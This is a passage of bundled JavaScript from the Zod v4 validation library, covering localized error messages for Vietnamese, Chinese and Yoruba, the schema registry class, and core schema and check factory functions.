        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i b\u1EAFt \u0111\u1EA7u b\u1EB1ng "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i k\u1EBFt th\xFAc b\u1EB1ng "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i bao g\u1ED3m "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i kh\u1EDBp v\u1EDBi m\u1EABu ${_issue.pattern}`;
        return `${FormatDictionary[_issue.format] ?? issue2.format} kh\xF4ng h\u1EE3p l\u1EC7`;
      }
      case "not_multiple_of":
        return `S\u1ED1 kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i l\xE0 b\u1ED9i s\u1ED1 c\u1EE7a ${issue2.divisor}`;
      case "unrecognized_keys":
        return `Kh\xF3a kh\xF4ng \u0111\u01B0\u1EE3c nh\u1EADn d\u1EA1ng: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `Kh\xF3a kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue2.origin}`;
      case "invalid_union":
        return "\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7";
      case "invalid_element":
        return `Gi\xE1 tr\u1ECB kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue2.origin}`;
      default:
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7`;
    }
  };
};
function vi_default() {
  return {
    localeError: error44()
  };
}
// node_modules/zod/v4/locales/zh-CN.js
var error45 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u7B26", verb: "\u5305\u542B" },
    file: { unit: "\u5B57\u8282", verb: "\u5305\u542B" },
    array: { unit: "\u9879", verb: "\u5305\u542B" },
    set: { unit: "\u9879", verb: "\u5305\u542B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u8F93\u5165",
    email: "\u7535\u5B50\u90AE\u4EF6",
    url: "URL",
    emoji: "\u8868\u60C5\u7B26\u53F7",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u671F\u65F6\u95F4",
    date: "ISO\u65E5\u671F",
    time: "ISO\u65F6\u95F4",
    duration: "ISO\u65F6\u957F",
    ipv4: "IPv4\u5730\u5740",
    ipv6: "IPv6\u5730\u5740",
    cidrv4: "IPv4\u7F51\u6BB5",
    cidrv6: "IPv6\u7F51\u6BB5",
    base64: "base64\u7F16\u7801\u5B57\u7B26\u4E32",
    base64url: "base64url\u7F16\u7801\u5B57\u7B26\u4E32",
    json_string: "JSON\u5B57\u7B26\u4E32",
    e164: "E.164\u53F7\u7801",
    jwt: "JWT",
    template_literal: "\u8F93\u5165"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u6570\u5B57",
    array: "\u6570\u7EC4",
    null: "\u7A7A\u503C(null)"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B instanceof ${issue2.expected}\uFF0C\u5B9E\u9645\u63A5\u6536 ${received}`;
        }
        return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${expected}\uFF0C\u5B9E\u9645\u63A5\u6536 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${stringifyPrimitive(issue2.values[0])}`;
        return `\u65E0\u6548\u9009\u9879\uFF1A\u671F\u671B\u4EE5\u4E0B\u4E4B\u4E00 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue2.origin ?? "\u503C"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u4E2A\u5143\u7D20"}`;
        return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue2.origin ?? "\u503C"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.prefix}" \u5F00\u5934`;
        if (_issue.format === "ends_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.suffix}" \u7ED3\u5C3E`;
        if (_issue.format === "includes")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u6EE1\u8DB3\u6B63\u5219\u8868\u8FBE\u5F0F ${_issue.pattern}`;
        return `\u65E0\u6548${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u65E0\u6548\u6570\u5B57\uFF1A\u5FC5\u987B\u662F ${issue2.divisor} \u7684\u500D\u6570`;
      case "unrecognized_keys":
        return `\u51FA\u73B0\u672A\u77E5\u7684\u952E(key): ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} \u4E2D\u7684\u952E(key)\u65E0\u6548`;
      case "invalid_union":
        return "\u65E0\u6548\u8F93\u5165";
      case "invalid_element":
        return `${issue2.origin} \u4E2D\u5305\u542B\u65E0\u6548\u503C(value)`;
      default:
        return `\u65E0\u6548\u8F93\u5165`;
    }
  };
};
function zh_CN_default() {
  return {
    localeError: error45()
  };
}
// node_modules/zod/v4/locales/zh-TW.js
var error46 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u5143", verb: "\u64C1\u6709" },
    file: { unit: "\u4F4D\u5143\u7D44", verb: "\u64C1\u6709" },
    array: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" },
    set: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u8F38\u5165",
    email: "\u90F5\u4EF6\u5730\u5740",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO \u65E5\u671F\u6642\u9593",
    date: "ISO \u65E5\u671F",
    time: "ISO \u6642\u9593",
    duration: "ISO \u671F\u9593",
    ipv4: "IPv4 \u4F4D\u5740",
    ipv6: "IPv6 \u4F4D\u5740",
    cidrv4: "IPv4 \u7BC4\u570D",
    cidrv6: "IPv6 \u7BC4\u570D",
    base64: "base64 \u7DE8\u78BC\u5B57\u4E32",
    base64url: "base64url \u7DE8\u78BC\u5B57\u4E32",
    json_string: "JSON \u5B57\u4E32",
    e164: "E.164 \u6578\u503C",
    jwt: "JWT",
    template_literal: "\u8F38\u5165"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA instanceof ${issue2.expected}\uFF0C\u4F46\u6536\u5230 ${received}`;
        }
        return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${expected}\uFF0C\u4F46\u6536\u5230 ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u7121\u6548\u7684\u8F38\u5165\u503C\uFF1A\u9810\u671F\u70BA ${stringifyPrimitive(issue2.values[0])}`;
        return `\u7121\u6548\u7684\u9078\u9805\uFF1A\u9810\u671F\u70BA\u4EE5\u4E0B\u5176\u4E2D\u4E4B\u4E00 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue2.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u500B\u5143\u7D20"}`;
        return `\u6578\u503C\u904E\u5927\uFF1A\u9810\u671F ${issue2.origin ?? "\u503C"} \u61C9\u70BA ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue2.origin} \u61C9\u70BA ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6578\u503C\u904E\u5C0F\uFF1A\u9810\u671F ${issue2.origin} \u61C9\u70BA ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.prefix}" \u958B\u982D`;
        }
        if (_issue.format === "ends_with")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u4EE5 "${_issue.suffix}" \u7D50\u5C3E`;
        if (_issue.format === "includes")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u7121\u6548\u7684\u5B57\u4E32\uFF1A\u5FC5\u9808\u7B26\u5408\u683C\u5F0F ${_issue.pattern}`;
        return `\u7121\u6548\u7684 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u7121\u6548\u7684\u6578\u5B57\uFF1A\u5FC5\u9808\u70BA ${issue2.divisor} \u7684\u500D\u6578`;
      case "unrecognized_keys":
        return `\u7121\u6CD5\u8B58\u5225\u7684\u9375\u503C${issue2.keys.length > 1 ? "\u5011" : ""}\uFF1A${joinValues(issue2.keys, "\u3001")}`;
      case "invalid_key":
        return `${issue2.origin} \u4E2D\u6709\u7121\u6548\u7684\u9375\u503C`;
      case "invalid_union":
        return "\u7121\u6548\u7684\u8F38\u5165\u503C";
      case "invalid_element":
        return `${issue2.origin} \u4E2D\u6709\u7121\u6548\u7684\u503C`;
      default:
        return `\u7121\u6548\u7684\u8F38\u5165\u503C`;
    }
  };
};
function zh_TW_default() {
  return {
    localeError: error46()
  };
}
// node_modules/zod/v4/locales/yo.js
var error47 = () => {
  const Sizable = {
    string: { unit: "\xE0mi", verb: "n\xED" },
    file: { unit: "bytes", verb: "n\xED" },
    array: { unit: "nkan", verb: "n\xED" },
    set: { unit: "nkan", verb: "n\xED" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9",
    email: "\xE0d\xEDr\u1EB9\u0301s\xEC \xECm\u1EB9\u0301l\xEC",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\xE0k\xF3k\xF2 ISO",
    date: "\u1ECDj\u1ECD\u0301 ISO",
    time: "\xE0k\xF3k\xF2 ISO",
    duration: "\xE0k\xF3k\xF2 t\xF3 p\xE9 ISO",
    ipv4: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv4",
    ipv6: "\xE0d\xEDr\u1EB9\u0301s\xEC IPv6",
    cidrv4: "\xE0gb\xE8gb\xE8 IPv4",
    cidrv6: "\xE0gb\xE8gb\xE8 IPv6",
    base64: "\u1ECD\u0300r\u1ECD\u0300 t\xED a k\u1ECD\u0301 n\xED base64",
    base64url: "\u1ECD\u0300r\u1ECD\u0300 base64url",
    json_string: "\u1ECD\u0300r\u1ECD\u0300 JSON",
    e164: "n\u1ECD\u0301mb\xE0 E.164",
    jwt: "JWT",
    template_literal: "\u1EB9\u0300r\u1ECD \xECb\xE1w\u1ECDl\xE9"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "n\u1ECD\u0301mb\xE0",
    array: "akop\u1ECD"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi instanceof ${issue2.expected}, \xE0m\u1ECD\u0300 a r\xED ${received}`;
        }
        return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${expected}, \xE0m\u1ECD\u0300 a r\xED ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e: a n\xED l\xE1ti fi ${stringifyPrimitive(issue2.values[0])}`;
        return `\xC0\u1E63\xE0y\xE0n a\u1E63\xEC\u1E63e: yan \u1ECD\u0300kan l\xE1ra ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue2.origin ?? "iye"} ${sizing.verb} ${adj}${issue2.maximum} ${sizing.unit}`;
        return `T\xF3 p\u1ECD\u0300 j\xF9: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue2.maximum}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 p\xE9 ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum} ${sizing.unit}`;
        return `K\xE9r\xE9 ju: a n\xED l\xE1ti j\u1EB9\u0301 ${adj}${issue2.minimum}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\u1EB9\u0300r\u1EB9\u0300 p\u1EB9\u0300l\xFA "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 par\xED p\u1EB9\u0300l\xFA "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 n\xED "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u1ECC\u0300r\u1ECD\u0300 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 b\xE1 \xE0p\u1EB9\u1EB9r\u1EB9 mu ${_issue.pattern}`;
        return `A\u1E63\xEC\u1E63e: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `N\u1ECD\u0301mb\xE0 a\u1E63\xEC\u1E63e: gb\u1ECD\u0301d\u1ECD\u0300 j\u1EB9\u0301 \xE8y\xE0 p\xEDp\xEDn ti ${issue2.divisor}`;
      case "unrecognized_keys":
        return `B\u1ECDt\xECn\xEC \xE0\xECm\u1ECD\u0300: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `B\u1ECDt\xECn\xEC a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue2.origin}`;
      case "invalid_union":
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
      case "invalid_element":
        return `Iye a\u1E63\xEC\u1E63e n\xEDn\xFA ${issue2.origin}`;
      default:
        return "\xCCb\xE1w\u1ECDl\xE9 a\u1E63\xEC\u1E63e";
    }
  };
};
function yo_default() {
  return {
    localeError: error47()
  };
}
// node_modules/zod/v4/core/registries.js
var _a;
var $output = Symbol("ZodOutput");
var $input = Symbol("ZodInput");

class $ZodRegistry {
  constructor() {
    this._map = new WeakMap;
    this._idmap = new Map;
  }
  add(schema, ..._meta) {
    const meta = _meta[0];
    this._map.set(schema, meta);
    if (meta && typeof meta === "object" && "id" in meta) {
      this._idmap.set(meta.id, schema);
    }
    return this;
  }
  clear() {
    this._map = new WeakMap;
    this._idmap = new Map;
    return this;
  }
  remove(schema) {
    const meta = this._map.get(schema);
    if (meta && typeof meta === "object" && "id" in meta) {
      this._idmap.delete(meta.id);
    }
    this._map.delete(schema);
    return this;
  }
  get(schema) {
    const p = schema._zod.parent;
    if (p) {
      const pm = { ...this.get(p) ?? {} };
      delete pm.id;
      const f = { ...pm, ...this._map.get(schema) };
      return Object.keys(f).length ? f : undefined;
    }
    return this._map.get(schema);
  }
  has(schema) {
    return this._map.has(schema);
  }
}
function registry() {
  return new $ZodRegistry;
}
(_a = globalThis).__zod_globalRegistry ?? (_a.__zod_globalRegistry = registry());
var globalRegistry = globalThis.__zod_globalRegistry;
// node_modules/zod/v4/core/api.js
function _string(Class2, params) {
  return new Class2({
    type: "string",
    ...normalizeParams(params)
  });
}
function _coercedString(Class2, params) {
  return new Class2({
    type: "string",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _email(Class2, params) {
  return new Class2({
    type: "string",
    format: "email",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _guid(Class2, params) {
  return new Class2({
    type: "string",
    format: "guid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _uuid(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _uuidv4(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v4",
    ...normalizeParams(params)
  });
}
function _uuidv6(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v6",
    ...normalizeParams(params)
  });
}
function _uuidv7(Class2, params) {
  return new Class2({
    type: "string",
    format: "uuid",
    check: "string_format",
    abort: false,
    version: "v7",
    ...normalizeParams(params)
  });
}
function _url(Class2, params) {
  return new Class2({
    type: "string",
    format: "url",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _emoji2(Class2, params) {
  return new Class2({
    type: "string",
    format: "emoji",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _nanoid(Class2, params) {
  return new Class2({
    type: "string",
    format: "nanoid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cuid(Class2, params) {
  return new Class2({
    type: "string",
    format: "cuid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cuid2(Class2, params) {
  return new Class2({
    type: "string",
    format: "cuid2",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ulid(Class2, params) {
  return new Class2({
    type: "string",
    format: "ulid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _xid(Class2, params) {
  return new Class2({
    type: "string",
    format: "xid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ksuid(Class2, params) {
  return new Class2({
    type: "string",
    format: "ksuid",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ipv4(Class2, params) {
  return new Class2({
    type: "string",
    format: "ipv4",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _ipv6(Class2, params) {
  return new Class2({
    type: "string",
    format: "ipv6",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _mac(Class2, params) {
  return new Class2({
    type: "string",
    format: "mac",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cidrv4(Class2, params) {
  return new Class2({
    type: "string",
    format: "cidrv4",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _cidrv6(Class2, params) {
  return new Class2({
    type: "string",
    format: "cidrv6",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _base64(Class2, params) {
  return new Class2({
    type: "string",
    format: "base64",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _base64url(Class2, params) {
  return new Class2({
    type: "string",
    format: "base64url",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _e164(Class2, params) {
  return new Class2({
    type: "string",
    format: "e164",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
function _jwt(Class2, params) {
  return new Class2({
    type: "string",
    format: "jwt",
    check: "string_format",
    abort: false,
    ...normalizeParams(params)
  });
}
var TimePrecision = {
  Any: null,
  Minute: -1,
  Second: 0,
  Millisecond: 3,
  Microsecond: 6
};
function _isoDateTime(Class2, params) {
  return new Class2({
    type: "string",
    format: "datetime",
    check: "string_format",
    offset: false,
    local: false,
    precision: null,
    ...normalizeParams(params)
  });
}
function _isoDate(Class2, params) {
  return new Class2({
    type: "string",
    format: "date",
    check: "string_format",
    ...normalizeParams(params)
  });
}
function _isoTime(Class2, params) {
  return new Class2({
    type: "string",
    format: "time",
    check: "string_format",
    precision: null,
    ...normalizeParams(params)
  });
}
function _isoDuration(Class2, params) {
  return new Class2({
    type: "string",
    format: "duration",
    check: "string_format",
    ...normalizeParams(params)
  });
}
function _number(Class2, params) {
  return new Class2({
    type: "number",
    checks: [],
    ...normalizeParams(params)
  });
}
function _coercedNumber(Class2, params) {
  return new Class2({
    type: "number",
    coerce: true,
    checks: [],
    ...normalizeParams(params)
  });
}
function _int(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "safeint",
    ...normalizeParams(params)
  });
}
function _float32(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float32",
    ...normalizeParams(params)
  });
}
function _float64(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "float64",
    ...normalizeParams(params)
  });
}
function _int32(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "int32",
    ...normalizeParams(params)
  });
}
function _uint32(Class2, params) {
  return new Class2({
    type: "number",
    check: "number_format",
    abort: false,
    format: "uint32",
    ...normalizeParams(params)
  });
}
function _boolean(Class2, params) {
  return new Class2({
    type: "boolean",
    ...normalizeParams(params)
  });
}
function _coercedBoolean(Class2, params) {
  return new Class2({
    type: "boolean",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _bigint(Class2, params) {
  return new Class2({
    type: "bigint",
    ...normalizeParams(params)
  });
}
function _coercedBigint(Class2, params) {
  return new Class2({
    type: "bigint",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _int64(Class2, params) {
  return new Class2({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "int64",
    ...normalizeParams(params)
  });
}
function _uint64(Class2, params) {
  return new Class2({
    type: "bigint",
    check: "bigint_format",
    abort: false,
    format: "uint64",
    ...normalizeParams(params)
  });
}
function _symbol(Class2, params) {
  return new Class2({
    type: "symbol",
    ...normalizeParams(params)
  });
}
function _undefined2(Class2, params) {
  return new Class2({
    type: "undefined",
    ...normalizeParams(params)
  });
}
function _null2(Class2, params) {
  return new Class2({
    type: "null",
    ...normalizeParams(params)
  });
}
function _any(Class2) {
  return new Class2({
    type: "any"
  });
}
function _unknown(Class2) {
  return new Class2({
    type: "unknown"
  });
}
function _never(Class2, params) {
  return new Class2({
    type: "never",
    ...normalizeParams(params)
  });
}
function _void(Class2, params) {
  return new Class2({
    type: "void",
    ...normalizeParams(params)
  });
}
function _date(Class2, params) {
  return new Class2({
    type: "date",
    ...normalizeParams(params)
  });
}
function _coercedDate(Class2, params) {
  return new Class2({
    type: "date",
    coerce: true,
    ...normalizeParams(params)
  });
}
function _nan(Class2, params) {
  return new Class2({
    type: "nan",
    ...normalizeParams(params)
  });
}
function _lt(value, params) {
  return new $ZodCheckLessThan({
    check: "less_than",
    ...normalizeParams(params),
    value,
    inclusive: false
  });
}
function _lte(value, params) {
  return new $ZodCheckLessThan({
    check: "less_than",
    ...normalizeParams(params),
    value,
    inclusive: true
  });
}
function _gt(value, params) {
  return new $ZodCheckGreaterThan({
    check: "greater_than",
    ...normalizeParams(params),
    value,
    inclusive: false
  });
}
function _gte(value, params) {
  return new $ZodCheckGreaterThan({
    check: "greater_than",
    ...normalizeParams(params),
    value,
    inclusive: true
  });
}
function _positive(params) {
  return _gt(0, params);
}
function _negative(params) {
  return _lt(0, params);
}
function _nonpositive(params) {
  return _lte(0, params);
}
function _nonnegative(params) {
  return _gte(0, params);
}
function _multipleOf(value, params) {
  return new $ZodCheckMultipleOf({
    check: "multiple_of",
    ...normalizeParams(params),
    value
  });
}
function _maxSize(maximum, params) {
  return new $ZodCheckMaxSize({
    check: "max_size",
    ...normalizeParams(params),
    maximum
  });
}
function _minSize(minimum, params) {
  return new $ZodCheckMinSize({
    check: "min_size",
    ...normalizeParams(params),
    minimum
  });
}
function _size(size, params) {
  return new $ZodCheckSizeEquals({
    check: "size_equals",
    ...normalizeParams(params),
    size
  });
}
function _maxLength(maximum, params) {
  const ch = new $ZodCheckMaxLength({
    check: "max_length",
    ...normalizeParams(params),
    maximum
  });
  return ch;
}
function _minLength(minimum, params) {
  return new $ZodCheckMinLength({
    check: "min_length",
    ...normalizeParams(params),
    minimum
  });
}
function _length(length, params) {
  return new $ZodCheckLengthEquals({
    check: "length_equals",
    ...normalizeParams(params),
    length
  });
}
function _regex(pattern, params) {
  return new $ZodCheckRegex({
    check: "string_format",
    format: "regex",
    ...normalizeParams(params),
    pattern
  });
}
function _lowercase(params) {
  return new $ZodCheckLowerCase({
    check: "string_format",
    format: "lowercase",
    ...normalizeParams(params)
  });
}
function _uppercase(params) {
  return new $ZodCheckUpperCase({
    check: "string_format",
    format: "uppercase",
    ...normalizeParams(params)
  });
}
function _includes(includes, params) {
  return new $ZodCheckIncludes({
    check: "string_format",
    format: "includes",
    ...normalizeParams(params),
    includes
  });
}
function _startsWith(prefix, params) {
  return new $ZodCheckStartsWith({
    check: "string_format",
    format: "starts_with",
    ...normalizeParams(params),
    prefix
  });
}
function _endsWith(suffix, params) {
  return new $ZodCheckEndsWith({
    check: "string_format",
    format: "ends_with",
    ...normalizeParams(params),
    suffix
  });
}
function _property(property, schema, params) {
  return new $ZodCheckProperty({
    check: "property",
    property,
    schema,
    ...normalizeParams(params)
  });
}
function _mime(types, params) {
  return new $ZodCheckMimeType({
    check: "mime_type",
    mime: types,
    ...normalizeParams(params)
  });
}
function _overwrite(tx) {
  return new $ZodCheckOverwrite({
    check: "overwrite",
    tx
  });
}
function _normalize(form) {
  return _overwrite((input) => input.normalize(form));
}
function _trim() {
  return _overwrite((input) => input.trim());
}
function _toLowerCase() {
  return _overwrite((input) => input.toLowerCase());
}
function _toUpperCase() {
  return _overwrite((input) => input.toUpperCase());
}
function _slugify() {
  return _overwrite((input) => slugify(input));
}
function _array(Class2, element, params) {
  return new Class2({
    type: "array",
    element,
    ...normalizeParams(params)
  });
}
function _union(Class2, options, params) {
  return new Class2({
    type: "union",
    options,
    ...normalizeParams(params)
  });
}
function _xor(Class2, options, params) {
  return new Class2({
    type: "union",
    options,
    inclusive: false,
    ...normalizeParams(params)
  });
}
function _discriminatedUnion(Class2, discriminator, options, params) {
  return new Class2({
    type: "union",
    options,
    discriminator,
    ...normalizeParams(params)
  });
}
function _intersection(Class2, left, right) {
  return new Class2({
    type: "intersection",
    left,
    right
  });
}
function _tuple(Class2, items, _paramsOrRest, _params) {
  const hasRest = _paramsOrRest instanceof $ZodType;
  const params = hasRest ? _params : _paramsOrRest;
  const rest = hasRest ? _paramsOrRest : null;
  return new Class2({
    type: "tuple",
    items,
    rest,
    ...normalizeParams(params)
  });
